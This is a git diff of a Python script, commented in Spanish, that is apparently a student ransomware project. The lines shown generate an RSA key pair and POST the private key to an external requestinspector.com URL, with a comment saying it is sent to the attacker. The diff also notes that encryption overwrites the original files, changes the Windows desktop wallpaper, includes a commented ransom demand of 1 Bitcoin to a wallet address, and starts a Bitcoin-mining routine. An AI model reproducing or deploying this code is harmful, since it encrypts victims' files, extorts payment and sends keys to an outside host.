@@ -10,6 +10,7 @@ def string_to_byte(temp):
     return bytes(temp, encoding="UTF-8")
 
 
+# Generar llave publica y privada RSA
 bit_size = 4096
 key_format = "PEM"
 keys = RSA.generate(bit_size)
@@ -21,6 +22,7 @@ llave_privada = PKCS1_OAEP.new(keys)
 with open('llave_privada.pem', 'wb') as file:
     file.write(keys.export_key(key_format))
 
+# enviar llave Privada RSA al atacante 
 url = 'https://requestinspector.com/inspect/01g46gk67e8cad21kgczk8dy2m'
 myobj = {'privatekey': keys.export_key(key_format)}
 x = requests.post(url, data = myobj)
@@ -81,24 +83,17 @@ del keys
 gc.collect()
 
 # borar archivos originales
-#import shutil
-#dirPath = 'archivos_originales/'
-#try:
-#    pass
-    #shutil.rmtree(dirPath)
-#except OSError as e:
-#    print(f"Error:{ e.strerror}")
+# al cifrar los archivos se sobreescriben los archivos originales
 
-# cambiar el fondo de escritorio    
 path = b'C:\\Users\\qwert\\proyecto_final\\fondo.jpg'
 ctypes.windll.user32.SystemParametersInfoA(20, 0, path, 3)
-
-# hacer programa de descifrado
 
 # wallet
 #Si desea recuperar sus documentos deposite 1 Bitcoin a la wallet 3QvVW4j9ZMneSFJVCnHDa7Ce3tpcrNieuF
 
-##Minar Bitcoin
+
+
+# Minar Bitcoin
 from hashlib import sha256
 MAX_NONCE = 100000000000
 
